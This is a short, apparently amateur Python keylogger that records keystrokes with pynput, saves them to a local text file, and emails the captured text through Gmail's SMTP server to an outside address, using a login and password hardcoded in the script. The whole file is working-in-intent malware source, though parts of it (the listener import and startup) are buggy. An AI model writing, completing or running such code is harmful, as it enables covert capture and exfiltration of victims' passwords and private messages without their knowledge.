import subprocess
import sys
import smtplib
import time
import pynput 
import os
keylist = []

class keylogger():

    def onpress(self, key):
        path = os.getcwd()
        filepath = path + '\ ' + 'key.txt'
        self._key = str(key)
        print(self._key)
        if self._key == 'Key.backspace':
                  keylist.pop(-1) 
                  print(keylist)
        elif self._key == 'Key.space': 
                  keylist.append(' ')
        elif self._key == 'Key.enter':
                  with open(filepath , 'a') as file:
                       file.write('\n')
                       for key in keylist:                      
                             file.write(key)  
                       file.close()
                  keylist.clear()
        else:
                  keylist.append(self._key)
                  print(keylist)
        nowtime = time.time()
        print(nowtime)
        xdd = nowtime - starttime
        print(xdd)
        if xdd > int(5):
               print('hi')
               self.send()

    def listen(self):
        with Listener(on_press = self.onpress ) as keylistener:
            keylistener.join()
            
        keylistener.start()
       
    def send(self):
         print('hi')
         path = os.getcwd()
         filepath = path + '\ ' + 'key.txt'
         data = open(filepath, 'r').read()
         send = smtplib.SMTP('smtp.gmail.com' , 587)
         send.starttls()
         send.login('fack.acc.for.hack@gmail.com' , 'fakeacc123456789')
         send.sendmail('fack.acc.for.hack@gmail.com' , 'foolisaachack@gmail.com', data)
         send.quit()
if __name__ == '__main__':
    starttime = time.time()
    print(starttime)
    keylogger = keylogger()
    keylogger.listen()
